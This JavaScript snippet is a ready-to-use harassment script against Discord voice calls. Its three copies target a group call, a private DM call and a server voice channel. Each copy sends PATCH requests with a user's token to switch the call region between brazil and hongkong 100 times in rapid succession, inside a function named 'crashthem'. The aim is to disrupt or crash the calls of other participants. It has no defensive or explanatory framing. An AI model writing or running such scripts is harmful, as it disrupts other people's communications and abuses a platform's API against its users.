/* group voice */

const url = "https://discord.com/api/v9/channels/952719657264091186/call"
const sleep=(sekssakujom)=>{return new Promise(resolve => setTimeout(resolve, sekssakujom))}
async function crashthem() {
	for(i=0;i<100;i++) {
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"region": "brazil"
		})
	}),
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"region": "hongkong"
		})
	})
	await sleep(100)
	}
}


/* private dm voice */

const url = "https://discord.com/api/v9/channels/952719620115152916/call"
const sleep=(sekssakujom)=>{return new Promise(resolve => setTimeout(resolve, sekssakujom))}
async function crashthem() {
	for(i=0;i<100;i++) {
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"region": "brazil"
		})
	}),
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"region": "hongkong"
		})
	})
	await sleep(100)
	}
}

/* server voice channel */

const url = "https://discord.com/api/v9/channels/952718081820606550"
const sleep=(sekssakujom)=>{return new Promise(resolve => setTimeout(resolve, sekssakujom))}
async function crashthem() {
	for(i=0;i<100;i++) {
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"rtc-region": "brazil"
		})
	}),
		fetch(url, 
		{"method":"PATCH", 
		"headers": {"content-type": "application/json", "authorization": " your-token"},
		"body": JSON.stringify({
			"rtc-region": "hongkong"
		})
	})
	await sleep(100)
	}
}